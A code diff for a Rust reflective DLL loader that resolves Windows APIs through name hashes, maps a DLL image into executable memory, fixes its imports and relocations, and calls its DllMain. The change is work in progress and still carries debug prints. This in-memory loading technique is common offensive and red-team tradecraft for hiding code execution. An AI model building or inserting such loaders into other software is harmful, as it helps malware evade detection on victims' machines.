@@ -1,6 +1,6 @@
 use std::{arch::asm, ffi::{CStr}, collections::BTreeMap, mem::size_of, intrinsics::{copy_nonoverlapping, transmute}};
 
-use winapi::{um::winnt::{PIMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}};
+use winapi::{um::winnt::{PIMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, DLL_PROCESS_ATTACH}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}};
 use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};
 use wchar::wch;
 
@@ -36,6 +36,14 @@ type fnVirtualAlloc = unsafe extern "system" fn(
     flProtect: DWORD
 ) -> LPVOID;
 
+#[allow(non_camel_case_types)]
+type fnDllMain = unsafe extern "system" fn(
+    module: HINSTANCE,
+    call_reason: DWORD,
+    reserved: LPVOID,
+) -> BOOL;
+
+
 // Hash
 const KERNEL32DLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("kernel32.dll"));
 const NTDLLDLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("ntdll.dll"));
@@ -52,8 +60,8 @@ static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
 static mut NT_FLUSH_INSTRUCTION_CACHE: Option<fnNtFlushInstructionCache> = None;
 
 
-
-pub fn reflective_loader() {
+//temp params
+pub fn reflective_loader(dll_bytes: *const u8) {
     // STEP 0: calculate our images current base address
 
     // we will start searching backwards from our callers return address.
@@ -67,27 +75,32 @@ pub fn reflective_loader() {
 		asm!("lea {rip}, [rip]", rip = out(reg) rip);
 	};
 
-    let mut current_image_base = rip & !0xfff;
+    //let mut current_image_base = rip & !0xfff;
+    let mut current_image_base = dll_bytes as usize;
     println!("[+] Return Address: {:#x}", current_image_base);
+
+
+    let mut current_nt_header: usize;
 
 	// loop through memory backwards searching for our images base address
     loop {
         if unsafe { (*(current_image_base as PIMAGE_DOS_HEADER)).e_magic == IMAGE_DOS_SIGNATURE } {
-            let mut header_value = unsafe { (*(current_image_base as PIMAGE_DOS_HEADER)).e_lfanew } as usize;
+            current_nt_header = unsafe { (*(current_image_base as PIMAGE_DOS_HEADER)).e_lfanew } as usize;
             // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
 			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
-            if header_value >= size_of::<IMAGE_DOS_HEADER>() && header_value < 1024 {
+            if current_nt_header >= size_of::<IMAGE_DOS_HEADER>() && current_nt_header < 1024 {
 
-                header_value += current_image_base;
+                current_nt_header += current_image_base;
 
                 #[cfg(target_arch = "x86")]
-                let validate = unsafe { (*(header_value as PIMAGE_NT_HEADERS32)).Signature };
+                let validate_signature = unsafe { (*(current_nt_header as PIMAGE_NT_HEADERS32)).Signature };
 
                 #[cfg(target_arch = "x86_64")]
-                let validate = unsafe { (*(header_value as PIMAGE_NT_HEADERS64)).Signature };
+                let validate_signature = unsafe { (*(current_nt_header as PIMAGE_NT_HEADERS64)).Signature };
 
                 // break if we have found a valid MZ/PE header
-                if validate == IMAGE_NT_SIGNATURE {
+                if validate_signature == IMAGE_NT_SIGNATURE {
+                    current_nt_header as PIMAGE_NT_HEADERS64;
                     break;
                 }
             }
@@ -148,15 +161,37 @@ pub fn reflective_loader() {
     // STEP 4: process our images import table...
     unsafe { resolve_imports(allocated_image_base.as_ptr()) };
 
-
-
     // STEP 5: process all of our images relocations...
     unsafe { rebase_image(allocated_image_base.as_ptr(), current_image_base as _) };
 
     // STEP 6: call our images entry point
+    #[cfg(target_arch = "x86")]
+    let current_nt_header = current_nt_header as PIMAGE_NT_HEADERS32;
+
+    #[cfg(target_arch = "x86_64")]
+    let current_nt_header = current_nt_header as PIMAGE_NT_HEADERS64;
+
+    let dll_main_address = unsafe { allocated_image_base.as_ptr() as usize + (*current_nt_header).OptionalHeader.AddressOfEntryPoint as usize };
+    println!("[+] DLLMain Address: {:#x}", dll_main_address);
+
+    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
+    unsafe { NT_FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
+
+    println!("[!] Calling DllMain...");
+    
+    #[allow(non_snake_case)]
+    let DllMain = unsafe { transmute::<_, fnDllMain>(dll_main_address) };
 
     pause();
+
+    // STEP 7: The DLLMain function to be executed
+    unsafe { DllMain(std::ptr::null_mut(), DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
+
+    // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
+    return;
 }
+
+
 
 /// Rebase the image / perform image base relocation
 unsafe fn rebase_image(allocated_image_base: *const u8, current_image_base: *mut u8) {
